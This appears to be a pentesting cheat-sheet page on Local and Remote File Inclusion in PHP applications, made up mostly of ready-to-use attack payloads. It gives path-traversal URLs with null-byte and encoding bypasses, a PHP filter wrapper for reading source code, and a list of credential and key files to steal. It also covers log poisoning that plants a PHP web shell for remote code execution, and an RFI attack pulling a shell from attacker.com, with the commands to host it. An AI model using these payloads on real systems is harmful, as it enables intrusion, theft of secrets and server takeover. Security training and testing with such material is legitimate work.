---
tags: [basics, technique, web, lfi, rfi]
---

[[Basics/Index|← Basics]]


- **LFI** (Local File Inclusion) — server reads a local file whose path is controlled by user input
- **RFI** (Remote File Inclusion) — server fetches and executes a remote file (requires `allow_url_include=On` in PHP)
- Most common in templating engines and `include()`/`require()` calls in PHP

## Path Traversal / LFI

```
# Basic traversal
http://target.com/index.php?page=../../../etc/passwd

# Null byte bypass (PHP < 5.3.4)
http://target.com/index.php?page=../../../etc/passwd%00

# Double encoding bypass
http://target.com/index.php?page=..%252f..%252f..%252fetc/passwd

# Using PHP wrappers
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
# Decode the response with: echo "<base64>" | base64 -d
```

## High-Value Files to Read (Linux)

```
/etc/passwd           # user list
/etc/shadow           # password hashes (needs root)
/etc/hosts
/proc/self/environ    # environment variables (may contain secrets)
/proc/self/cmdline    # command line of current process
/var/log/apache2/access.log   # log poisoning target
/var/log/auth.log
~/.ssh/id_rsa         # SSH private key
~/.bash_history
```

## Log Poisoning → RCE

If you can read server logs via LFI, inject a PHP payload into the log via a malicious User-Agent:

```bash
# Inject into Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Then trigger via LFI
http://target.com/?page=/var/log/apache2/access.log&cmd=id
```

## Remote File Inclusion

```
# PHP RFI (requires allow_url_include=On)
http://target.com/?page=http://attacker.com/shell.php
http://target.com/?page=ftp://attacker.com/shell.php

# Host the shell on attacker:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

## Tools

```bash
# LFI scan with ffuf wordlist
ffuf -u http://target.com/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# Automated LFI testing
lfimap -u "http://target.com/index.php?page=test"
```